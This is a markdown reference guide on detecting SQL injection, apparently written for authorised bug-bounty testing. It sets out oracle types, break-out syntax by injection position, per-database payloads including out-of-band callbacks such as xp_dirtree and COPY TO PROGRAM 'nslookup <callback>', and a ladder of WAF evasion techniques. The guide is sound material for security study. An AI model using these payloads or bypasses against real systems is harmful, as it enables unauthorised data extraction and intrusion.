# SQLi detection — oracles, payload grammar, blind/OOB, WAF evasion

Detection means **demonstrating control over the query**, not firing a payload library. Pick
the weakest sufficient oracle for the entry point and the fingerprinted DBMS, and match the
payload grammar to the *injection position* — where in the query the input lands decides which
break-out syntax works.

## 1. Oracle selection (weakest sufficient first)

1. **Reflection / error-based**: the error message (or response) echoes SQL fragments or the
   result of injected expressions. Fastest, most convincing — but many modern APIs swallow
   errors into generic `{ "error": "invalid" }` shapes.
2. **Boolean differential**: a payload and its control produce two *stable, distinct*
   responses (row count, ordering, a field's value, HTTP status). Works when errors are
   hidden; the response does not need to contain the data — only to correlate with a
   condition you control.
3. **Time-based**: `SLEEP`-family functions gate a measurable delta. Powerful but expensive —
   measure baselines first, repeat 3×, keep sleeps ≤5s, and mind rate limits and shared
   infrastructure (a sleep payload is a DoS argument against *you*).
4. **Out-of-band (OOB)**: the database itself makes a network request to your callback
   server (DNS/HTTP). Best when the response channel is fully opaque; needs a
   network-egress-capable DBMS feature and a permissive egress path.

## 2. Payload grammar by injection position

First determine *where* the input lands in the query; the same input parameter can be used
differently than you assume:

| Position | Typical use | Break-out approach |
|---|---|---|
| String literal (`WHERE name = '<input>'`) | search, login | `'` closes the literal; comment the rest: `--`, `#` (MySQL), `/* */` |
| Numeric literal (`WHERE id = <input>`) | ids, pagination | No quotes needed: `1 OR 1=1`, `1 AND 1=2`, arithmetic (`1-1`, `1+1`) |
| Identifier (``ORDER BY <input>``, column list) | sort, fields, CSV import headers | No closing quote; inject whole SQL: `name) UNION SELECT ...--` or conditional expressions directly |
| LIKE pattern (`LIKE '%<input>%'`) | search boxes | `'` closes; mind the trailing `%`: `x%' AND 1=1-- ` |
| IN-list (`IN (<input>))`) | bulk endpoints | multi-value position, `1,2,(SELECT 1)` |
| LIMIT/OFFSET (`LIMIT <input>`) | pagination | integer-only in MySQL; Postgres allows full expressions (`LIMIT (SELECT CASE WHEN ... THEN 1 ELSE 2 END)`) |
| Comment / hint (Rails `annotate`, MySQL hints) | rare | break *out of the comment*: `--` / `/*` inside the injected text |
| JSON path (`JSON_EXTRACT(doc, '$.<input>')`, jsonb operators) | filter DSLs, GraphQL JSON args | path is a string — `'$.x') ...` style breakout or key injection |
| HQL/JPQL / ORM expression | Hibernate, query builders | entity names and property paths; `from User where ...` grammar, not raw SQL |

Identifier positions are the modern sweet spot: **there is no quote to escape**, so payloads
do not look like classic SQLi to scanners or WAFs, and `ORDER BY`-position injection accepts
whole subquery expressions (see the GitLab MilestoneFinder case: a `CASE` expression as the
sort key turns row ordering into a boolean oracle).

## 3. Per-DBMS quick reference (fingerprint first, then match)

**MySQL**: concat `CONCAT(a,b)`; comments `--␣`, `#`; sleep `SLEEP(n)`; version `@@version`;
identifier quote `` ` ``; backslash escaping inside strings; error-based oracle
`EXTRACTVALUE(1,CONCAT(0x5c,(SELECT …)))`; versioned comments `/*!SELECT*/`;
OOB: Windows DNS via `LOAD_FILE('\\\\<callback>\\x')` (UNC path), `LOAD_FILE` needs
`secure_file_priv` off; stacked queries usually blocked (PHP/Python APIs the exception).

**PostgreSQL**: `a‖b`; `--`; `pg_sleep(n)`; `version()`; identifier quote `"`; no backslash
escapes in standard strings (`E''` enables them — itself a config probe); error-based
`AND 1337=CAST('~'‖(SELECT version())::text‖'~' AS NUMERIC)`; whole-DB dump via
`query_to_xml()`/`database_to_xml()`; OOB: `dblink`, DNS via
`COPY (SELECT '') TO PROGRAM 'nslookup <callback>'`, `COPY PROGRAM` (superuser),
large objects (`lo_import` → OID → `lo_get`/`pg_largeobject`) for file read,
`lo_from_bytea`+`lo_put`+`lo_export` for file write; `pg_read_file`/`pg_ls_dir`
(privileged); obfuscation `CHR(65)‖CHR(66)…`, `$$dollar$$` quoting; stacked statements
commonly available (node-postgres, pg_query family). Before impact claims: privilege
recon — `role_table_grants`, `current_setting('is_superuser')`.

**MSSQL**: `a+b` (needs cast); `--`; `WAITFOR DELAY '0:0:n'`; `@@version`, `db_name()`;
identifier quote `[]`; OOB: `xp_dirtree('\\<callback>\x')`, `xp_fileexist`,
`OPENROWSET` (needs config); stacked queries commonly enabled.

**SQLite**: `a‖b`; `--`; `sqlite_version()`; no sleep function — use heavy computation
(`randomblob`, `LIKE` on big data) for time oracles; identifier quote `"`; strict
prepared statements — identifier positions and string-built queries are the surfaces.

**Oracle**: `‖`; `--`; timing `dbms_pipe.receive_message(('a'),10)` (grounded form —
not just "heavy queries"); banner from `v$instance` when readable; OOB: `UTL_HTTP`,
`UTL_INADDR`, `EXTRACTVALUE(xmltype(<XXE>))` (privileges).

## 4. Boolean oracle construction

Build the differential from the *application's own semantics*:

- Row-count diff: `AND 1=1` (returns rows) vs `AND 1=2` (empty result) — different page
  length/content/status.
- Ordering diff (ORDER BY position): `CASE WHEN <condition> THEN col_a ELSE col_b END` —
  the order of two known rows flips with the condition (GitLab MilestoneFinder pattern).
- Value diff: arithmetic in a selected column changes a rendered number
  (`1 UNION SELECT 1+1` style or expression in an identifier position).
- Error/no-error diff: `WHERE id = (CASE WHEN <cond> THEN 1 ELSE 1/0 END)` — an error fires
  only when the condition holds (careful: divisor must be `0` only on one branch; use
  `1/0` vs `1`).

Each pair: control variant + test variant, repeated ≥3×, baseline recorded.

## 5. Time oracle discipline

- Measure the endpoint's natural latency distribution first (10 baseline requests).
- Use `SLEEP(5)`-equivalents, never larger, and never in loops beyond the 3 repeats.
- Prefer conditional delays (`CASE WHEN <cond> THEN SLEEP(5) ELSE SLEEP(0) END`) so the
  control request proves causality.
- State deltas as measured ranges in the report (`~5.1–5.3s vs ~0.2–0.4s`).

## 6. OOB technique per DBMS

- DNS/HTTP callback to *your own* Collaborator/interact.sh endpoint only; check program
  policy before making the database egress anywhere.
- MSSQL: `xp_dirtree('\\<callback>\a')` and `xp_fileexist`; Postgres: `dblink`;
  Oracle: `UTL_HTTP`, `UTL_INADDR`; MySQL: rare in practice (needs `LOAD_FILE`/UDF).
- OOB is an *oracle* (one bit per callback) — pair it with conditional callbacks:
  `… WHERE … THEN <oob-call> ELSE NULL`.

## 7. WAF evasion (grammar-aware)

Ground rule from a disclosed AWS WAF report (HackerOne 3591725, grammar-aware mutation vs
`AWSManagedRulesSQLiRuleSet` at default LOW sensitivity): WAF rules match payload *patterns*;
the database matches *grammar*. Mutations that stay grammatically valid while breaking the
pattern pass: boolean-operator mutations (`OR` → `‖`, `&&`), arithmetic truth expressions
(`1-1`, `1+1`, `0+1` instead of literals), and unusual operators (`<=>`). AWS's own guidance
after that report: inspect **all** request components (query string, body, URI path, headers,
cookies) and apply **repeated decoding** transformations.

**The transport-class bypass, verified** — Claroty Team82 "{JS-ON: Security-OFF}":
appending **JSON syntax to the SQLi payload** bypasses WAFs that do not parse JSON bodies
(demonstrated against AWS and Imperva WAFs; Fortinet/Barracuda alerted on it; Picus 2024
retested Palo Alto/F5/Imperva/AWS/Cloudflare and confirmed the class). Payloads wrapped in
JSON structure never resemble the flat SQLi patterns the rules expect. Academic backing:
BWAFSQLi adversarial SQL variants (ACM 2026).

Practical evasion ladder, grounded first:

1. **JSON-transport wrapping** (Claroty): deliver the payload inside JSON structure —
   `{"filter":{"q":"…payload…"}}` — plus nested paths and arrays
   (`filter[]=…` — the Valve `countryFilter[]` pattern), GraphQL arguments,
   unusual `Content-Type`.
2. **Case/whitespace**: `SeLeCt`, inline comments `/*!*/` (MySQL), `/**/` between tokens
   (PortSwigger filter bypasses).
3. **Encoding**: URL double-encoding, repeated decoding mismatches, GBK/multibyte
   contexts (grounded as an *escaping* bypass class — Shiflett/phpdelusions).
4. **Grammar substitution** (the strongest): rewrite with the target DBMS's
   valid-but-rare grammar — `1-1` for `1=1`-style truth, `a‖b` concat, `LIKE` vs `=`,
   derived tables instead of `UNION`, `CHR()‖CHR()` concatenation, `$$dollar$$` quoting.
5. **Position**: if the WAF watches values, inject identifiers (`ORDER BY` position),
   which are unquoted and un-suspicious to value-oriented rules.

Secondary/unverified (listicle-level; use only if nothing grounded works, and never cite
as established): HPP (parameter pollution), unicode homoglyph quotes, `\u0027` JSON
escapes as WAF bypasses.

If everything is blocked: report the *sink* with the honest statement that egress was
WAF-filtered on this route, and check whether the same parameter reaches SQL through another
route (different origin, mobile API, internal tool) that is unfiltered.

## 8. Tooling boundaries

- sqlmap: point at a *single classified parameter* after manual grammar analysis; pass
  `--prefix`/`--suffix` for identifier positions; `--technique` to exclude time-based on
  fragile targets; `--second-url`/`--second-req` for second-order flows
  (trigger request ≠ storage request). Never as a blind host-sweep.
- Manual request pairing (Burp Repeater/comparer) remains the core skill: build, send,
  diff, repeat.
